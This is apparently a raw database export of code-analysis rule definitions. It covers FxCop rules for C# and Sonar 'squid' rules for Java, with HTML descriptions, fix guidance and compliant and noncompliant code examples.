READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806793	1511453806794	1
347	CA1003: Use generic event handler instances	UseGenericEventHandlerInstances	CA1003	fxcop	<h2>Cause</h2>\n<p>\n            A type contains a delegate that returns void, whose signature contains two parameters (the first an object and the second a type that is assignable to EventArgs), and the containing assembly targets .NET Framework 2.0.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Before .NET Framework 2.0, in order to pass custom information to the event handler, a new delegate had to be declared that specified a class that was derived from the <code>System.EventArgs</code> class. This is no longer true in .NET Framework 2.0, which introduced the System.EventHandler&lt;TEventArgs&gt; delegate. This generic delegate allows any class that is derived from <code>EventArgs</code> to be used together with the event handler.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the delegate and replace its use by using the System.EventHandler&lt;TEventArgs&gt; delegate. If the delegate is autogenerated by the Visual Basic compiler, change the syntax of the event declaration to use the System.EventHandler&lt;TEventArgs&gt; delegate.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182178.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182178.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806795	1511453806796	1
348	CA1304: Specify CultureInfo	SpecifyCultureInfo	CA1304	fxcop	<h2>Cause</h2>\n<p>\n            A method or constructor calls a member that has an overload that accepts a <code>System.Globalization.CultureInfo</code> parameter, and the method or constructor does not call the overload that takes the <code>CultureInfo</code> parameter. This rule ignores calls to the following methods:\n            <ul>\n              <li>\n\n\n                    <code>Activator.CreateInstance</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>ResourceManager.GetObject</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>ResourceManager.GetString</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a <code>CultureInfo</code> or <code>System.IFormatProvider</code> object is not supplied, the default value that is supplied by the overloaded member might not have the effect that you want in all locales. Also, .NET Framework members choose default culture and formatting based on assumptions that might not be correct for your code. To ensure the code works as expected for your scenarios, you should supply culture-specific information according to the following guidelines:\n            <ul>\n              <li>\n                If the value will be displayed to the user, use the current culture. See <code>CultureInfo.CurrentCulture</code>.\n              </li>\n              <li>\n                If the value will be stored and accessed by software, that is, persisted to a file or database, use the invariant culture. See <code>CultureInfo.InvariantCulture</code>.\n              </li>\n              <li>\n                If you do not know the destination of the value, have the data consumer or provider specify the culture.\n              </li>\n            </ul>\n            Note that <code>CultureInfo.CurrentUICulture</code> is used only to retrieve localized resources by using an instance of the <code>System.Resources.ResourceManager</code> class.\n            Even if the default behavior of the overloaded member is appropriate for your needs, it is better to explicitly call the culture-specific overload so that your code is self-documenting and more easily maintained.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, use the overload that takes a <code>CultureInfo</code> or <code>IFormatProvider</code> and specify the argument according to the guidelines that were listed earlier.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when it is certain that the default culture/format provider is the correct choice, and where code maintainability is not an important development priority.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:SpecifyIFormatProvider}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182189.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182189.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806796	1511453806797	1
496	Array designators "[]" should be located after the type in method signatures	S1195	S1195	squid	<p>According to the Java Language Specification: </p>\n<blockquote>\n<p>For compatibility with older versions of the Java SE platform,</p>\n<p>the declaration of a method that returns an array is allowed to place (some or all of) the empty bracket pairs that form the declaration of the array type after the formal parameter list.</p>\n<p>This obsolescent syntax should not be used in new code.</p>\n</blockquote>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int getVector()[] { /* ... */ }    // Noncompliant\n\npublic int[] getMatrix()[] { /* ... */ }  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int[] getVector() { /* ... */ }\n\npublic int[][] getMatrix() { /* ... */ } \n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453807019	1511453807019	1
497	"equals" methods should be symmetric and work for subclasses	S2162	S2162	squid	<p>A key facet of the <code>equals</code> contract is that if <code>a.equals(b)</code> then <code>b.equals(a)</code>, i.e. that the relationship is symmetric. </p>\n<p>Using <code>instanceof</code> breaks the contract when there are subclasses, because while the child is an <code>instanceof</code> the parent, the parent is not an <code>intanceof</code> the child. For instance, assume that <code>Raspberry extends Fruit</code> and adds some fields (requiring a new implementation of <code>equals</code>):</p>\n<pre>\nFruit fruit = new Fruit();\nRaspberry raspberry = new Raspberry();\n\nif (raspberry instanceof Fruit) { ... } // true\nif (fruit instanceof Raspberry) { ... } // false\n</pre>\n<p>If similar <code>instanceof</code> checks were used in the classes' <code>equals</code> methods, the symmetry principle would be broken:</p>\n<pre>\nraspberry.equals(fruit); // false\nfruit.equals(raspberry); //true\n</pre>\n<p>Additionally, non <code>final</code> classes shouldn't use a hardcoded class name in the <code>equals</code> method because doing so breaks the method for subclasses. Instead, make the comparison dynamic.</p>\n<p>Further, comparing to an unrelated class type breaks the contract for that unrelated type, because while <code>thisClass.equals(unrelatedClass)</code> can return true, <code>unrelatedClass.equals(thisClass)</code> will not.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Fruit extends Food {\n  private Season ripe;\n\n  public boolean equals(Object obj) {\n    if (obj == this) {\n      return true;\n    }\n    if (obj == null) {\n      return false;\n    }\n    if (Fruit.class == obj.getClass()) { // Noncompliant; broken for child classes\n      return ripe.equals(((Fruit)obj).getRipe());\n    }\n    if (obj instanceof Fruit ) {  // Noncompliant; broken for child classes\n      return ripe.equals(((Fruit)obj).getRipe());\n    }\n    else if (obj instanceof Season) { // Noncompliant; symmetry broken for Season class\n      // ...\n    }\n    //...\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Fruit extends Food {\n  private Season ripe;\n\n  public boolean equals(Object obj) {\n    if (obj == this) {\n      return true;\n    }\n    if (obj == null) {\n      return false;\n    }\n    if (this.getClass() == obj.getClass()) {\n      return ripe.equals(((Fruit)obj).getRipe());\n    }\n    return false;\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807020	1511453807020	2
349	CA1804: Remove unused locals	RemoveUnusedLocals	CA1804	fxcop	<h2>Cause</h2>\n<p>\n            A method declares a local variable but does not use the variable except possibly as the recipient of an assignment statement. For analysis by this rule, the tested assembly must be built with debugging information and the associated program database (.pdb) file must be available.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Unused local variables and unnecessary assignments increase the size of an assembly and decrease performance.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove or use the local variable. Note that the C# compiler that is included with .NET Framework 2.0 removes unused local variables when the <code>optimize</code> option is enabled.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if the variable was compiler emitted. It is also safe to suppress a warning from this rule, or to disable the rule, if performance and code maintenance are not primary concerns.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveLocals}<br/>\n\n\n\n\n                {rule:fxcop:AvoidUncalledPrivateCode}<br/>\n\n\n\n\n                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>\n\n\n\n\n                {rule:fxcop:ReviewUnusedParameters}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182278.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182278.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806797	1511453806798	1
350	CA1057: String URI overloads call System.Uri overloads	StringUriOverloadsCallSystemUriOverloads	CA1057	fxcop	<h2>Cause</h2>\n<p>\n            A type declares method overloads that differ only by the replacement of a string parameter with a <code>System.Uri</code> parameter, and the overload that takes the string parameter does not call the overload that takes the <code>Uri</code> parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Because the overloads differ only by the string/<code>Uri</code> parameter, the string is assumed to represent a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>Uri</code> class provides these services in a safe and secure manner. To reap the benefits of the <code>Uri</code> class, the string overload should call the <code>Uri</code> overload using the string argument.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Re-implement the method that uses the string representation of the URI so that it creates an instance of the <code>Uri</code> class using the string argument, and then passes the <code>Uri</code> object to the overload that has the <code>Uri</code> parameter.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the string parameter does not represent a URI.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriReturnValuesShouldNotBeStrings}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182170.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182170.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806799	1511453806799	1
498	Unused protected methods should be removed	UnusedProtectedMethod	UnusedProtectedMethod	squid	<p>Protected methods that are never used by any of the classes in the same project are suspected to be dead code. Dead code is unnecessary, inoperative code that should be removed. Removing dead code makes maintenance easier by decreasing the size of the maintained code base, thereby making it easier to understand the program and preventing the introduction of bugs.</p>\n<p>Unused protected methods are not considered dead code in the following cases:</p>\n<ul>\n<li> Protected methods which override a parent class method.</li>\n<li> Protected methods of an abstract class.</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	unused	f	HTML	1511453807021	1511453807021	1
499	Files should contain only one top-level class or interface each	S1996	S1996	squid	<p>\n  A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.\n  This is doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or interface per file.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	per extra "class" or "interface"	\N	brain-overload	f	HTML	1511453807021	1511453807022	1
500	"finalize" should not set fields to "null"	S2165	S2165	squid	<p>There is no point in setting class fields to <code>null</code> in a finalizer. If this this is a hint to the garbage collector, it is unnecessary - the object will be garbage collected anyway - and doing so may actually cause extra work for the garbage collector.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Foo {\n  private String name;\n\n  @Override\n  void finalize() {\n    name = null;  // Noncompliant; completely unnecessary\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,performance	f	HTML	1511453807022	1511453807022	1
351	CA1806: Do not ignore method results	DoNotIgnoreMethodResults	CA1806	fxcop	<h2>Cause</h2>\n<p>\n            There are several possible reasons for this warning:\n            <ul>\n              <li>\n                A new object is created but never used.\n              </li>\n              <li>\n                A method that creates and returns a new string is called and the new string is never used.\n              </li>\n              <li>\n                A COM or P/Invoke method that returns a HRESULT or error code that is never used. Rule Description\n              </li>\n            </ul>\n            Unnecessary object creation and the associated garbage collection of the unused object degrade performance.\n            Strings are immutable and methods such as String.ToUpper returns a new instance of a string instead of modifying the instance of the string in the calling method.\n            Ignoring HRESULT or error code can lead to unexpected behavior in error conditions or to low-resource conditions.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            If method A creates a new instance of B object that is never used, pass the instance as an argument to another method or assign the instance to a variable. If the object creation is unnecessary, remove the it.-or-\n            If method A calls method B, but does not use the new string instance that the method B returns. Pass the instance as an argument to another method, assign the instance to a variable. Or remove the call if it is unnecessary.\n            -or-\n            If method A calls method B, but does not use the HRESULT or error code that the method returns. Use the result in a conditional statement, assign the result to a variable, or pass it as an argument to another method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule unless the act of creating the object serves some purpose.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182273.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182273.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806800	1511453806801	1
352	CA2214: Do not call overridable methods in constructors	DoNotCallOverridableMethodsInConstructors	CA2214	fxcop	<h2>Cause</h2>\n<p>\n            The constructor of an unsealed type calls a virtual method defined in its class.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a virtual method is called, the actual type that executes the method is not selected until run time. When a constructor calls a virtual method, it is possible that the constructor for the instance that invokes the method has not executed.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, do not call a type's virtual methods from within the type's constructors.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. The constructor should be redesigned to eliminate the call to the virtual method.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182331.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182331.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806801	1511453806802	1
353	CA1058: Types should not extend certain base types	TypesShouldNotExtendCertainBaseTypes	CA1058	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type extends certain base types. Currently, this rule reports types that derive from the following types:\n            <ul>\n              <li>\n\n\n                    <code>System.ApplicationException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Xml.XmlDocument</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.CollectionBase</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.DictionaryBase</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Queue</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.ReadOnlyCollectionBase</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.SortedList</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Stack</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            For .NET Framework version 1, it was recommended to derive new exceptions from <code>ApplicationException</code>. The recommendation has changed and new exceptions should derive from <code>System.Exception</code> or one of its subclasses in the <code>System</code> namespace.\n            Do not create a subclass of <code>XmlDocument</code> if you want to create an XML view of an underlying object model or data source.\n\n\n\n\n\n\n                    Non-generic Collections\n\n\n\n\n\n\n\n\n\n\n                Use and/or extend generic collections whenever possible. Do not extend non-generic collections in your code, unless you shipped it previously.\n\n                  Examples of Incorrect Usage\n\n\n\n\n\n\n\n\n\n\n            <pre>\npublic class MyCollection : CollectionBase\n{\n}\n\npublic class MyReadOnlyCollection : ReadOnlyCollectionBase\n{\n}\n</pre>\n\n\n\n\nExamples of Correct Usage\n\n\n\n\n\n\n\n\n\n            <pre>\npublic class MyCollection : Collection&lt;T&gt;\n{\n}\n\npublic class MyReadOnlyCollection : ReadOnlyCollection&lt;T&gt;\n{\n}\n</pre>\n\n\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, derive the type from a different base type or a generic collection.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule for violations about <code>ApplicationException</code>. It is safe to suppress a warning from this rule for violations about <code>XmlDocument</code>. It is safe to suppress a warning about a non-generic collection if the code was released previously.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182171.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182171.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806802	1511453806803	1
354	CA1065: Do not raise exceptions in unexpected locations	DoNotRaiseExceptionsInUnexpectedLocations	CA1065	fxcop	<h2>Cause</h2>\n<p>\n            A method that is not expected to throw exceptions throws an exception.\n</p>\n<h2>Rule Description</h2>\n\n<h3>Property Get Methods</h3>\n<p>\n                Properties are basically smart fields. Therefore, they should behave like a field as much as possible. Fields do not throw exceptions and neither should properties. If you have a property that throws an exception, consider making it a method.\n                The following exceptions are allowed to be thrown from a property get method:\n                <ul>\n                  <li>\n\n\n                        <code>System.InvalidOperationException</code>\n                       and all derivatives (including <code>System.ObjectDisposedException</code>)\n                  </li>\n                  <li>\n\n\n                        <code>System.NotSupportedException</code>\n                       and all derivatives\n                  </li>\n                  <li>\n\n\n                        <code>System.ArgumentException</code>\n                       (only from indexed get)\n                  </li>\n                  <li>\n\n\n                        <code>KeyNotFoundException</code>\n                       (only from indexed get)\n                  </li>\n                </ul>\n</p>\n<h3>Event Accessor Methods</h3>\n<p>\n                Event accessors should be simple operations that do not throw exceptions. An event should not throw an exception when you try to add or remove an event handler.\n                The following exceptions are allowed to be thrown from an event accesor:\n                <ul>\n                  <li>\n\n\n                        <code>System.InvalidOperationException</code>\n                       and all derivatives (including <code>System.ObjectDisposedException</code>)\n                  </li>\n                  <li>\n\n\n                        <code>System.NotSupportedException</code>\n                       and all derivatives\n                  </li>\n                  <li>\n\n\n                        <code>ArgumentException</code>\n                       and derivatives\n                  </li>\n                </ul>\n</p>\n<h3>Equals Methods</h3>\n<p>\n                The following Equals methods should not throw exceptions:\n                <ul>\n                  <li>\n\n\n                        <code>Object.Equals</code>\n\n\n                  </li>\n                  <li>\n\n                      M:IEquatable.Equals\n\n                  </li>\n                </ul>\n                An Equals method should return <code>true</code> or <code>false</code> instead of throwing an exception. For example, if Equals is passed two mismatched types it should just return <code>false</code> instead of throwing an <code>ArgumentException</code>.\n</p>\n<h3>GetHashCode Methods</h3>\n<p>\n                The following GetHashCode methods should usually not throw exceptions:\n                <ul>\n                  <li>\n\n\n                        <code>GetHashCode</code>\n\n\n                  </li>\n                  <li>\n\n                      M:IEqualityComparer.GetHashCode(T)\n\n                  </li>\n                </ul>\n\n                  GetHashCode should always return a value. Otherwise, you can lose items in the hash table.\n                The versions of GetHashCode that take an argument can throw an <code>ArgumentException</code>. However, Object.GetHashCode should never throw an exception.\n</p>\n<h3>ToString Methods</h3>\n<p>\n                The debugger uses <code>Object.ToString</code> to help display information about objects in string format. Therefore, ToString should not change the state of an object and it should not throw exceptions.\n</p>\n<h3>Static Constructors</h3>\n<p>\n                Throwing exceptions from a static constructor causes the type to be unusable in the current application domain. You should have a very good reason (such as a security issue) for throwing an exception from a static constructor.\n</p>\n<h3>Finalizers</h3>\n<p>\n                Throwing an exception from a finalizer causes the CLR to fail fast, which tears down the process. Therefore, throwing exceptions in a finalizer should always be avoided.\n</p>\n<h3>Dispose Methods</h3>\n<p>\n                A <code>IDisposable.Dispose</code> method should not throw an exception. Dispose is often called as part of the clean up logic in a <code>finally</code> clause. Therefore, explicitly throwing an exception from Dispose forces the user to add exception handling inside the <code>finally</code> clause.\n                The Dispose(false) code path should never throw exceptions, because this is almost always called from a finalizer.\n</p>\n<h3>Equality Operators (==, !=)</h3>\n<p>\n                Like Equals methods, equality operators should return either <code>true</code> or <code>false</code> and should not throw exceptions.\n</p>\n<h3>Implicit Cast Operators</h3>\n<p>\n                Because the user is often unaware that an implicit cast operator has been called, an exception thrown by the implicit cast operator is completely unexpected. Therefore, no exceptions should be thrown from implicit cast operators.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            For property getters, either change the logic so that it no longer has to throw an exception, or change the property into a method.\n            For all other method types listed previously, change the logic so that it no longer must throw an exception.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the violation was caused by an exception declaration instead of a thrown exception.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA2219: Do not raise exceptions in exception clauses\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb386039.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386039.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806803	1511453806804	1
355	CA1821: Remove empty finalizers	RemoveEmptyFinalizers	CA1821	fxcop	<h2>Cause</h2>\n<p>\n            A type implements a finalizer that is empty, calls only the base type finalizer, or calls only conditionally emitted methods.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Whenever you can, avoid finalizers because of the additional performance overhead that is involved in tracking object lifetime. The garbage collector will run the finalizer before it collects the object. This means that two collections will be required to collect the object. An empty finalizer incurs this added overhead without any benefit.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove the empty finalizer. If a finalizer is required for debugging, enclose the whole finalizer in #if DEBUG / #endif directives.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a message from this rule. Failure to suppress finalization decreases performance and provides no benefits.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264476.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264476.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806804	1511453806805	1
356	CA2121: Static constructors should be private	StaticConstructorsShouldBePrivate	CA2121	fxcop	<h2>Cause</h2>\n<p>\n            A type has a static constructor that is not private.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A static constructor, also known as a class constructor, is used to initialize a type. The system calls the static constructor before the first instance of the type is created or any static members are referenced. The user has no control over when the static constructor is called. If a static constructor is not private, it can be called by code other than the system. Depending on the operations that are performed in the constructor, this can cause unexpected behavior.\n            This rule is enforced by the C# and Visual Basic .NET compilers.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Violations are typically caused by one of the following actions:\n            <ul>\n              <li>\n                You defined a static constructor for your type and did not make it private.\n              </li>\n              <li>\n                The programming language compiler added a default static constructor to your type and did not make it private.\n              </li>\n            </ul>\n            To fix the first kind of violation, make your static constructor private. To fix the second kind, add a private static constructor to your type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress these violations. If your software design requires an explicit call to a static constructor, it is likely that the design contains serious flaws and should be reviewed.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182320.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182320.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806806	1511453806806	1
357	CA1056: URI properties should not be strings	UriPropertiesShouldNotBeStrings	CA1056	fxcop	<h2>Cause</h2>\n<p>\n            A type declares a string property whose name contains "uri", "Uri", "urn", "Urn", "url", or "Url".\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule splits the property name into tokens based on the Pascal casing convention and checks whether each token equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the rule assumes that the property represents a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>System.Uri</code> class provides these services in a safe and secure manner.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the property to a <code>Uri</code> type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the property does not represent a URI.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriReturnValuesShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>\n\n\n\n\n                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182175.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182175.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806807	1511453806807	1
358	CA1719: Parameter names should not match member names	ParameterNamesShouldNotMatchMemberNames	CA1719	fxcop	<h2>Cause</h2>\n<p>\n            The name of an externally visible member matches, in a case-insensitive comparison, the name of one of its parameters.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A parameter name should communicate the meaning of a parameter and a member name should communicate the meaning of a member. It would be a rare design where these were the same. Naming a parameter the same as its member name is unintuitive and makes the library difficult to use.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Select a parameter name that does not match the member name.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            For new development, no known scenarios occur where you must suppress a warning from this rule. For shipping libraries, you might have to suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldNotContainUnderscores}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182252.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182252.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806808	1511453806808	1
359	CA2146: Types must be at least as critical as their base types and interfaces	TypesMustBeAtLeastAsCriticalAsBaseTypes	CA2146	fxcop	<h2>Cause</h2>\n<p>\n            A transparent type is derived from a type that is marked with the <code>SecuritySafeCriticalAttribute</code> or the <code>SecurityCriticalAttribute</code>, or a type that is marked with the <code>SecuritySafeCriticalAttribute</code> attribute is derived from a type that is marked with the <code>SecurityCriticalAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires when a derived type has a security transparency attribute that is not as critical as its base type or implemented interface. Only critical types can derive from critical base types or implement critical interfaces, and only critical or safe-critical types can derive from safe-critical base types or implement safe-critical interfaces. Violations of this rule in level 2 transparency result in a <code>TypeLoadException</code> for the derived type.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix this violation, mark the derived or implementing type with a transparency attribute that is at least as critical as the base type or interface.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997443.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997443.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806809	1511453806809	1
360	CA1711: Identifiers should not have incorrect suffix	IdentifiersShouldNotHaveIncorrectSuffix	CA1711	fxcop	<h2>Cause</h2>\n<p>\n            An identifier has an incorrect suffix.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By convention, only the names of types that extend certain base types or that implement certain interfaces, or types derived from these types, should end with specific reserved suffixes. Other type names should not use these reserved suffixes.\n            The following table lists the reserved suffixes and the base types and interfaces with which they are associated.\n\n\n\n\n\n\n\n                    Suffix\n\n\n                    Base type/Interface\n\n\n\n\n                    Attribute\n\n\n\n\n                        <code>System.Attribute</code>\n\n\n\n\n\n\n                    Collection\n\n\n\n\n                        <code>System.Collections.ICollection</code>\n\n\n\n\n                        <code>System.Collections.IEnumerable</code>\n\n\n\n\n                        <code>System.Collections.Queue</code>\n\n\n\n\n                        <code>System.Collections.Stack</code>\n\n\n\n\n                        <code>System.Collections.Generic.ICollection&lt;T&gt;</code>\n\n\n\n\n                        <code>System.Data.DataSet</code>\n\n\n\n\n                        <code>System.Data.DataTable</code>\n\n\n\n\n\n\n                    Dictionary\n\n\n\n\n                        <code>System.Collections.IDictionary</code>\n\n\n\n\n                        System.Collections.Generic.IDictionary&lt;TKey, TValue&gt;\n\n\n\n\n\n\n                    EventArgs\n\n\n\n\n                        <code>System.EventArgs</code>\n\n\n\n\n\n\n                    EventHandler\n\n\n                    An event-handler delegate\n\n\n\n\n                    Exception\n\n\n\n\n                        <code>System.Exception</code>\n\n\n\n\n\n\n                    Permission\n\n\n\n\n                        <code>System.Security.IPermission</code>\n\n\n\n\n\n\n                    Queue\n\n\n\n\n                        <code>System.Collections.Queue</code>\n\n\n\n\n\n\n                    